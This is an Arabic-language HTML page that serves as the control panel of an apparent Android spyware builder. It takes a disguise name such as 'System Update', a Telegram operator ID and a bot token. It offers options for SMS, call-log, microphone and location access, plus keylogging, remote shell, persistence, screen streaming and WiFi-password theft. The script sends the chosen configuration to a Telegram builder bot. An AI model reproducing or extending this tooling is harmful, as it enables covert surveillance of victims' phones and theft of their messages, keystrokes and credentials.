<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>APK Builder Pro — Ultra</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#05060f;--card:#0d1024;--card2:#141833;
  --accent:#7c3aed;--accent2:#ec4899;--accent3:#06b6d4;
  --text:#e2e8f0;--muted:#94a3b8;--border:#1e2947;
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Cairo',sans-serif;
  background:radial-gradient(ellipse at top,#1a1f3a 0%,#05060f 70%);
  min-height:100vh;color:var(--text);padding:20px;
  display:flex;align-items:center;justify-content:center}
.container{max-width:780px;width:100%;
  background:linear-gradient(145deg,var(--card),var(--card2));
  border-radius:28px;
  box-shadow:0 30px 100px rgba(124,58,237,.3),0 0 0 1px rgba(124,58,237,.2);
  padding:44px;position:relative;overflow:hidden}
.container::before{content:'';position:absolute;top:-140px;right:-140px;
  width:400px;height:400px;
  background:radial-gradient(circle,rgba(124,58,237,.45),transparent 70%);
  filter:blur(70px);pointer-events:none}
.container::after{content:'';position:absolute;bottom:-140px;left:-140px;
  width:400px;height:400px;
  background:radial-gradient(circle,rgba(236,72,153,.35),transparent 70%);
  filter:blur(70px);pointer-events:none}
.crown{font-size:56px;text-align:center;margin-bottom:12px;
  filter:drop-shadow(0 0 40px rgba(124,58,237,.8));
  animation:float 4s ease-in-out infinite}
@keyframes float{0%,100%{transform:translateY(0) rotate(-5deg)}50%{transform:translateY(-10px) rotate(5deg)}}
h1{font-size:34px;font-weight:900;text-align:center;
  background:linear-gradient(135deg,#7c3aed,#ec4899,#06b6d4);
  background-size:200% 200%;-webkit-background-clip:text;
  -webkit-text-fill-color:transparent;animation:shine 4s linear infinite;
  margin-bottom:8px}
@keyframes shine{0%{background-position:0% 50%}100%{background-position:200% 50%}}
.subtitle{text-align:center;color:var(--muted);margin-bottom:28px;
  font-size:14px;font-weight:700}
.badges{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-bottom:32px}
.badge{background:rgba(124,58,237,.15);color:#c4b5fd;padding:6px 14px;
  border-radius:20px;font-size:11px;font-weight:700;
  border:1px solid rgba(124,58,237,.3)}
.badge.pink{background:rgba(236,72,153,.15);color:#fbcfe8;border-color:rgba(236,72,153,.3)}
.badge.cyan{background:rgba(6,182,212,.15);color:#a5f3fc;border-color:rgba(6,182,212,.3)}
.field{margin-bottom:22px;position:relative;z-index:1}
label{display:flex;align-items:center;gap:10px;font-weight:700;
  margin-bottom:10px;font-size:14px}
label .num{display:inline-flex;align-items:center;justify-content:center;
  background:linear-gradient(135deg,var(--accent),var(--accent2));
  color:#fff;width:26px;height:26px;border-radius:8px;
  font-size:12px;font-weight:800;box-shadow:0 4px 12px rgba(124,58,237,.4)}
input[type=text],input[type=number]{width:100%;padding:15px 18px;
  background:#05060f;border:2px solid var(--border);border-radius:14px;
  color:var(--text);font-size:15px;font-family:inherit;transition:.3s}
input:focus{outline:none;border-color:var(--accent);
  box-shadow:0 0 0 4px rgba(124,58,237,.2);background:#0a0e27}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.chip{display:flex;align-items:center;gap:10px;padding:12px 14px;
  background:#05060f;border:2px solid var(--border);border-radius:12px;
  cursor:pointer;transition:.25s;user-select:none;font-size:13px;font-weight:600}
.chip:hover{border-color:rgba(124,58,237,.6);transform:translateY(-2px)}
.chip.selected{border-color:var(--accent);
  background:linear-gradient(135deg,rgba(124,58,237,.15),rgba(236,72,153,.08));
  box-shadow:0 0 20px rgba(124,58,237,.25)}
.check{width:20px;height:20px;border-radius:6px;border:2px solid var(--border);
  display:flex;align-items:center;justify-content:center;
  font-size:12px;color:transparent;transition:.2s;flex-shrink:0}
.chip.selected .check{background:linear-gradient(135deg,var(--accent),var(--accent2));
  border-color:transparent;color:#fff}
.icon-box{width:150px;height:150px;margin:0 auto;border-radius:26px;
  border:2px dashed rgba(124,58,237,.5);background:#05060f center/cover no-repeat;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:8px;cursor:pointer;transition:.3s;color:var(--muted);
  font-size:12px;font-weight:600}
.icon-box:hover{border-color:var(--accent);
  box-shadow:0 0 40px rgba(124,58,237,.3);transform:scale(1.03)}
.icon-box .em{font-size:36px}
.btn{width:100%;padding:18px;
  background:linear-gradient(135deg,var(--accent),var(--accent2),var(--accent3));
  background-size:200% 200%;color:#fff;border:none;border-radius:16px;
  font-size:17px;font-weight:800;cursor:pointer;font-family:inherit;
  transition:.3s;box-shadow:0 12px 40px rgba(124,58,237,.5);
  display:flex;align-items:center;justify-content:center;gap:10px;
  animation:shine 4s linear infinite;position:relative;z-index:1}
.btn:hover{transform:translateY(-3px);box-shadow:0 20px 60px rgba(124,58,237,.7)}
.btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
.status{margin-top:18px;padding:14px;border-radius:12px;text-align:center;
  font-size:13px;font-weight:700;display:none}
.status.ok{background:rgba(16,185,129,.15);color:#6ee7b7;display:block;
  border:1px solid rgba(16,185,129,.3)}
.status.err{background:rgba(239,68,68,.15);color:#fca5a5;display:block;
  border:1px solid rgba(239,68,68,.3)}
.status.info{background:rgba(124,58,237,.15);color:#c4b5fd;display:block;
  border:1px solid rgba(124,58,237,.3)}
.footer{text-align:center;margin-top:24px;color:var(--muted);
  font-size:12px;position:relative;z-index:1}
.divider{height:1px;
  background:linear-gradient(90deg,transparent,var(--border),transparent);
  margin:22px 0}
@media(max-width:500px){.container{padding:26px}h1{font-size:26px}
  .grid{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="container">
  <div class="crown">👑</div>
  <h1>APK Builder Pro</h1>
  <p class="subtitle">Ultra Edition — الإصدار النهائي الفخم</p>

  <div class="badges">
    <span class="badge">⚡ بناء سريع</span>
    <span class="badge pink">🔐 توقيع تلقائي</span>
    <span class="badge cyan">🎨 تصميم فخم</span>
    <span class="badge">🤖 بوت مدمج</span>
  </div>

  <div class="divider"></div>

  <form id="form">
    <div class="field">
      <label><span class="num">1</span> اسم التطبيق</label>
      <input type="text" id="appName" placeholder="System Update" required>
    </div>
    <div class="field">
      <label><span class="num">2</span> اسم الحزمة</label>
      <input type="text" id="pkgName" placeholder="com.example.app" required>
    </div>
    <div class="field">
      <label><span class="num">3</span> Telegram ID</label>
      <input type="number" id="adminId" placeholder="123456789" required>
    </div>
    <div class="field">
      <label><span class="num">4</span> توكن البوت الفرعي</label>
      <input type="text" id="botToken" placeholder="123456:ABC..." required>
    </div>
    <div class="field">
      <label><span class="num">5</span> الصلاحيات</label>
      <div class="grid" id="permsGrid"></div>
    </div>
    <div class="field">
      <label><span class="num">6</span> المميزات</label>
      <div class="grid" id="featsGrid"></div>
    </div>
    <div class="field">
      <label><span class="num">7</span> الأيقونة</label>
      <div class="icon-box" id="iconBox">
        <span class="em">📸</span>
        <span>اضغط للاختيار</span>
      </div>
      <input type="file" id="iconFile" accept="image/*" hidden>
    </div>

    <button type="submit" class="btn" id="submitBtn">
      🚀 إرسال الأمر للبوت
    </button>
    <div class="status" id="status"></div>
  </form>

  <div class="footer">© 2025 APK Builder Pro — Ultra Edition</div>
</div>

<script>
const BOT_USERNAME = "YOUR_BUILDER_BOT";

const PERMS = [
  ['camera','📷 الكاميرا'],
  ['read_storage','📁 قراءة الملفات'],
  ['write_storage','💾 كتابة الملفات'],
  ['contacts','📞 جهات الاتصال'],
  ['location','📍 الموقع'],
  ['sms','✉️ الرسائل'],
  ['call_log','📋 سجل المكالمات'],
  ['mic','🎙️ الميكروفون'],
  ['calendar','📅 التقويم'],
  ['phone_state','📱 حالة الهاتف'],
];

const FEATS = [
  ['screenshot','🖥️ لقطة الشاشة'],
  ['keylogger','⌨️ Keylogger'],
  ['notifications','🔔 الإشعارات'],
  ['apps_list','📦 التطبيقات'],
  ['wifi_pass','📶 WiFi'],
  ['shell','💻 Shell'],
  ['persist','♻️ إعادة تشغيل'],
  ['clipboard','📋 الحافظة'],
  ['audio_record','🎙️ تسجيل صوت'],
  ['screen_stream','📡 بث الشاشة'],
];

function renderChips(id, items){
  const c = document.getElementById(id);
  c.innerHTML = items.map(([k,l]) =>
    `<div class="chip" data-key="${k}">
       <div class="check">✓</div><span>${l}</span>
     </div>`).join('');
  c.querySelectorAll('.chip').forEach(el=>{
    el.onclick = () => el.classList.toggle('selected');
  });
}
renderChips('permsGrid', PERMS);
renderChips('featsGrid', FEATS);

const iconBox  = document.getElementById('iconBox');
const iconFile = document.getElementById('iconFile');
iconBox.onclick = () => iconFile.click();
iconFile.onchange = e => {
  const f = e.target.files[0]; if(!f) return;
  const r = new FileReader();
  r.onload = ev => {
    iconBox.style.backgroundImage = `url(${ev.target.result})`;
    iconBox.innerHTML = '';
  };
  r.readAsDataURL(f);
};

document.getElementById('form').onsubmit = e => {
  e.preventDefault();
  const st  = document.getElementById('status');
  const btn = document.getElementById('submitBtn');
  const appName  = document.getElementById('appName').value.trim();
  const pkgName  = document.getElementById('pkgName').value.trim();
  const adminId  = document.getElementById('adminId').value.trim();
  const botToken = document.getElementById('botToken').value.trim();

  if(!/^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/i.test(pkgName)){
    st.className='status err';
    st.textContent='❌ اسم الحزمة غير صالح (مثال: com.test.app)';
    return;
  }
  if(!/^\d+:\S+$/.test(botToken)){
    st.className='status err';
    st.textContent='❌ توكن البوت غير صالح';
    return;
  }

  const perms = [...document.querySelectorAll('#permsGrid .chip.selected')]
    .map(el => el.dataset.key).join(',');
  const feats = [...document.querySelectorAll('#featsGrid .chip.selected')]
    .map(el => el.dataset.key).join(',');

  const payload = encodeURIComponent(JSON.stringify({
    n: appName, p: pkgName, a: adminId, t: botToken, r: perms, f: feats
  }));

  st.className = 'status info';
  st.textContent = '⏳ جاري فتح البوت...';
  btn.disabled = true;

  setTimeout(() => {
    window.open(`https://t.me/${BOT_USERNAME}?start=${payload}`, '_blank');
    st.className = 'status ok';
    st.textContent = '✅ تم فتح البوت — اتبع التعليمات';
    btn.disabled = false;
  }, 500);
};
</script>
</body>
</html>
